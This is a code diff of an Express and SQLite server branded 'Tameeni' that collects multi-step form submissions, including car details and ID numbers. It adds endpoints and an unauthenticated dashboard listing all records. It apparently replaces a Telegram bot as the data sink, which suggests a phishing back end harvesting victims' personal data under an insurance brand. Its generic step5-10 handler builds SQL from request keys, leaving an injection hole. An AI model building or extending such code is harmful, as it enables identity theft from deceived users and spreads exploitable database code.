@@ -15,17 +15,17 @@ app.use(morgan('combined'));
 app.use(express.json());
 app.use(express.static('public'));
 
-// إعداد قاعدة البيانات
+// Database setup
 const db = new sqlite3.Database('./tameeni_data.db', (err) => {
   if (err) {
-    console.error('خطأ في الاتصال بقاعدة البيانات:', err);
+    console.error('Database connection error:', err);
   } else {
-    console.log('تم الاتصال بقاعدة البيانات بنجاح');
+    console.log('Database connected successfully');
     initializeDatabase();
   }
 });
 
-// إنشاء جداول قاعدة البيانات
+// Initialize database tables
 function initializeDatabase() {
   db.run(`
     CREATE TABLE IF NOT EXISTS submissions (
@@ -49,14 +49,14 @@ function initializeDatabase() {
       additionalCoverage TEXT,
       coverageAmount TEXT,
       finalData TEXT,
-      status TEXT DEFAULT 'جديد'
+      status TEXT DEFAULT 'new'
     )
   `);
 }
 
 // API Endpoints
 
-// استقبال بيانات خطوة 1
+// Step 1 data collection
 app.post('/api/step1', (req, res) => {
   try {
     const data = req.body;
@@ -80,20 +80,20 @@ app.post('/api/step1', (req, res) => {
       data.carYear
     ], function(err) {
       if (err) {
-        console.error('خطأ في حفظ البيانات:', err);
-        res.status(500).json({ error: 'خطأ في حفظ البيانات' });
+        console.error('Error saving step1 data:', err);
+        res.status(500).json({ error: 'Error saving data' });
       } else {
         res.json({ success: true, id: id });
       }
     });
     
   } catch (error) {
-    console.error('خطأ في معالجة البيانات:', error);
-    res.status(500).json({ error: 'خطأ في الخادم' });
+    console.error('Error processing step1 data:', error);
+    res.status(500).json({ error: 'Server error' });
   }
 });
 
-// استقبال بيانات خطوة 2
+// Step 2 data collection
 app.post('/api/step2', (req, res) => {
   try {
     const data = req.body;
@@ -112,28 +112,87 @@ app.post('/api/step2', (req, res) => {
       data.idNumber
     ], function(err) {
       if (err) {
-        console.error('خطأ في تحديث البيانات:', err);
-        res.status(500).json({ error: 'خطأ في حفظ البيانات' });
+        console.error('Error updating step2 data:', err);
+        res.status(500).json({ error: 'Error saving data' });
       } else {
         res.json({ success: true });
       }
     });
     
   } catch (error) {
-    console.error('خطأ في معالجة البيانات:', error);
-    res.status(500).json({ error: 'خطأ في الخادم' });
+    console.error('Error processing step2 data:', error);
+    res.status(500).json({ error: 'Server error' });
   }
 });
 
-// استقبال البيانات النهائية
+// Step 3 data collection
+app.post('/api/step3', (req, res) => {
+  try {
+    const data = req.body;
+    
+    const stmt = db.prepare(`
+      UPDATE submissions SET 
+        insuranceType = ?, insuranceClass = ?, step = 3
+      WHERE idNumber = ? AND step = 2
+    `);
+    
+    stmt.run([
+      data.insuranceType,
+      data.insuranceClass,
+      data.idNumber
+    ], function(err) {
+      if (err) {
+        console.error('Error saving step3 data:', err);
+        res.status(500).json({ error: 'Error saving data' });
+      } else {
+        res.json({ success: true });
+      }
+    });
+    
+  } catch (error) {
+    console.error('Error processing step3 data:', error);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+// Step 4 data collection
+app.post('/api/step4', (req, res) => {
+  try {
+    const data = req.body;
+    
+    const stmt = db.prepare(`
+      UPDATE submissions SET 
+        additionalCoverage = ?, step = 4
+      WHERE idNumber = ? AND step = 3
+    `);
+    
+    stmt.run([
+      data.additionalCoverage,
+      data.idNumber
+    ], function(err) {
+      if (err) {
+        console.error('Error saving step4 data:', err);
+        res.status(500).json({ error: 'Error saving data' });
+      } else {
+        res.json({ success: true });
+      }
+    });
+    
+  } catch (error) {
+    console.error('Error processing step4 data:', error);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+// Final data collection
 app.post('/api/final', (req, res) => {
   try {
     const data = req.body;
     
     const stmt = db.prepare(`
       UPDATE submissions SET 
-        coverageAmount = ?, finalData = ?, step = 5, status = 'مكتمل'
-      WHERE idNumber = ? AND step = 2
+        coverageAmount = ?, finalData = ?, step = 5, status = 'completed'
+      WHERE idNumber = ? AND step = 4
     `);
     
     stmt.run([
@@ -142,20 +201,52 @@ app.post('/api/final', (req, res) => {
       data.idNumber
     ], function(err) {
       if (err) {
-        console.error('خطأ في حفظ البيانات النهائية:', err);
-        res.status(500).json({ error: 'خطأ في حفظ البيانات' });
+        console.error('Error saving final data:', err);
+        res.status(500).json({ error: 'Error saving data' });
       } else {
         res.json({ success: true });
       }
     });
     
   } catch (error) {
-    console.error('خطأ في معالجة البيانات النهائية:', error);
-    res.status(500).json({ error: 'خطأ في الخادم' });
+    console.error('Error processing final data:', error);
+    res.status(500).json({ error: 'Server error' });
   }
 });
 
-// جلب جميع البيانات
+// Support for additional steps
+['step5', 'step6', 'step7', 'step8', 'step9', 'step10'].forEach(stepName => {
+  app.post(`/api/${stepName}`, (req, res) => {
+    try {
+      const data = req.body;
+      const stepNum = parseInt(stepName.replace('step', ''));
+      
+      const stmt = db.prepare(`
+        UPDATE submissions SET 
+          ${Object.keys(data).map(key => `${key} = ?`).join(', ')},
+          step = ?
+        WHERE idNumber = ? AND step < ?
+      `);
+      
+      const values = [...Object.values(data), stepNum, data.idNumber, stepNum];
+      
+      stmt.run(values, function(err) {
+        if (err) {
+          console.error(`Error saving data for step ${stepNum}:`, err);
+          res.status(500).json({ error: 'Error saving data' });
+        } else {
+          res.json({ success: true });
+        }
+      });
+      
+    } catch (error) {
+      console.error(`Error processing data for step ${stepName}:`, error);
+      res.status(500).json({ error: 'Server error' });
+    }
+  });
+});
+
+// Get all submissions
 app.get('/api/submissions', (req, res) => {
   db.all(`
     SELECT * FROM submissions 
@@ -163,15 +254,15 @@ app.get('/api/submissions', (req, res) => {
     LIMIT 100
   `, (err, rows) => {
     if (err) {
-      console.error('خطأ في جلب البيانات:', err);
-      res.status(500).json({ error: 'خطأ في جلب البيانات' });
+      console.error('Error fetching submissions:', err);
+      res.status(500).json({ error: 'Error fetching data' });
     } else {
       res.json(rows);
     }
   });
 });
 
-// جلب البيانات بحسب الحالة
+// Get submissions by status
 app.get('/api/submissions/status/:status', (req, res) => {
   const status = req.params.status;
   db.all(`
@@ -180,15 +271,15 @@ app.get('/api/submissions/status/:status', (req, res) => {
     ORDER BY timestamp DESC
   `, [status], (err, rows) => {
     if (err) {
-      console.error('خطأ في جلب البيانات:', err);
-      res.status(500).json({ error: 'خطأ في جلب البيانات' });
+      console.error('Error fetching submissions by status:', err);
+      res.status(500).json({ error: 'Error fetching data' });
     } else {
       res.json(rows);
     }
   });
 });
 
-// إحصائيات سريعة
+// Quick statistics
 app.get('/api/stats', (req, res) => {
   const queries = [
     new Promise((resolve, reject) => {
@@ -198,7 +289,7 @@ app.get('/api/stats', (req, res) => {
       });
     }),
     new Promise((resolve, reject) => {
-      db.get('SELECT COUNT(*) as completed FROM submissions WHERE status = "مكتمل"', (err, row) => {
+      db.get('SELECT COUNT(*) as completed FROM submissions WHERE status = "completed"', (err, row) => {
         if (err) reject(err);
         else resolve(row.completed);
       });
@@ -219,12 +310,12 @@ app.get('/api/stats', (req, res) => {
       completion_rate: total > 0 ? Math.round((completed / total) * 100) : 0
     });
   }).catch(err => {
-    console.error('خطأ في جلب الإحصائيات:', err);
-    res.status(500).json({ error: 'خطأ في جلب الإحصائيات' });
+    console.error('Error fetching stats:', err);
+    res.status(500).json({ error: 'Error fetching data' });
   });
 });
 
-// صفحة البداية
+// Root page
 app.get('/', (req, res) => {
   res.redirect('/dashboard.html');
 });
@@ -237,7 +328,7 @@ app.get('/api-status', (req, res) => {
     <head>
       <meta charset="utf-8">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
-      <title>تأميني - API Dashboard</title>
+      <title>Tameeni - API Dashboard</title>
       <style>
         body {
           font-family: 'Cairo', Arial, sans-serif;
@@ -297,43 +388,46 @@ app.get('/api-status', (req, res) => {
     </head>
     <body>
       <div class="container">
-        <h1>🚀 تأميني - Dashboard API</h1>
+        <h1>🚀 Tameeni - Dashboard API</h1>
         <div class="status">
-          ✅ الخادم يعمل بنجاح!
+          ✅ Server is running successfully!
         </div>
         <div class="api-info">
-          <h3>📡 API Endpoints المتاحة:</h3>
-          <div class="api-endpoint">POST /api/step1 - بيانات الخطوة الأولى</div>
-          <div class="api-endpoint">POST /api/step2 - بيانات الخطوة الثانية</div>
-          <div class="api-endpoint">POST /api/final - البيانات النهائية</div>
-          <div class="api-endpoint">GET /api/submissions - عرض جميع البيانات</div>
-          <div class="api-endpoint">GET /api/stats - الإحصائيات السريعة</div>
+          <h3>📡 Available API Endpoints:</h3>
+          <div class="api-endpoint">POST /api/step1 - Step 1 data</div>
+          <div class="api-endpoint">POST /api/step2 - Step 2 data</div>
+          <div class="api-endpoint">POST /api/step3 - Step 3 data</div>
+          <div class="api-endpoint">POST /api/step4 - Step 4 data</div>
+          <div class="api-endpoint">POST /api/step5-10 - Additional steps</div>
+          <div class="api-endpoint">POST /api/final - Final data</div>
+          <div class="api-endpoint">GET /api/submissions - View all data</div>
+          <div class="api-endpoint">GET /api/stats - Quick statistics</div>
         </div>
         <div class="links">
-          <a href="/dashboard.html">📊 فتح لوحة التحكم</a>
-          <a href="/api-status">ℹ️ معلومات API</a>
+          <a href="/dashboard.html">📊 Open Dashboard</a>
+          <a href="/api-status">ℹ️ API Info</a>
         </div>
-        <p>يمكنك الآن ربط موقعك بـ API هذا بدلاً من بوت تيليجرام</p>
+        <p>Your website can now use this API instead of Telegram bot</p>
       </div>
     </body>
     </html>
   `);
 });
 
-// بدء الخادم
+// Start server
 app.listen(PORT, () => {
-  console.log(`🚀 الخادم يعمل على المنفذ ${PORT}`);
-  console.log(`📊 Dashboard API جاهز للاستخدام`);
+  console.log(`🚀 Server running on port ${PORT}`);
+  console.log(`📊 Dashboard API ready`);
 });
 
-// معالجة إغلاق التطبيق
+// Graceful shutdown
 process.on('SIGINT', () => {
-  console.log('\n⏹️  جاري إغلاق الخادم...');
+  console.log('\n⏹️  Shutting down server...');
   db.close((err) => {
     if (err) {
-      console.error('خطأ في إغلاق قاعدة البيانات:', err);
+      console.error('Error closing database:', err);
     } else {
-      console.log('✅ تم إغلاق قاعدة البيانات بنجاح');
+      console.log('✅ Database closed successfully');
     }
     process.exit(0);
   });
